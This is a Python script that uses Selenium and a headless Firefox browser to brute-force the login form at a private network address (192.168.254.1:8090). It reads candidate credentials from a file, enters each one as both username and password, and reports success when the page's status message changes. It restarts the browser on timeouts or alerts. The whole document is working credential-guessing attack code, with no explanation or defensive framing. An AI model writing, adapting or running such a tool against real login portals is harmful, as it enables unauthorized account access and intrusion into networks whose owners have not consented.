from pyvirtualdisplay import Display

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
from selenium.webdriver.firefox.options import Options

# Create a virtual display to start the browser in the background.
display = Display(visible=0, size=(1920, 1080))
display.start()
options = Options()
options.headless = True

browser = webdriver.Firefox(options=options, log_path="/var/log/geckodriver/geckodriver.log")
browser.get("http://192.168.254.1:8090")
browser.set_page_load_timeout(2)


with open("passwords.txt", "r") as file:
    for login in file.readlines():
        try:
            username = browser.find_element_by_id("username")
            password = browser.find_element_by_id("password")
            submit = browser.find_element_by_class_name("buttonrow")

            username.send_keys(login)
            password.send_keys(login)
            submit.click()

            statusmessage = browser.find_element_by_id("statusmessage")

            if statusmessage.get_attribute("class") == "unshown":
                print(f"Logged in successfully as {login}")
                exit()
            else:
                print("Some error occured")
                browser.refresh()
        
        except (TimeoutException, UnexpectedAlertPresentException) as e:
            browser.quit()
            browser = webdriver.Firefox()
            browser.get("http://192.168.254.1:8090")
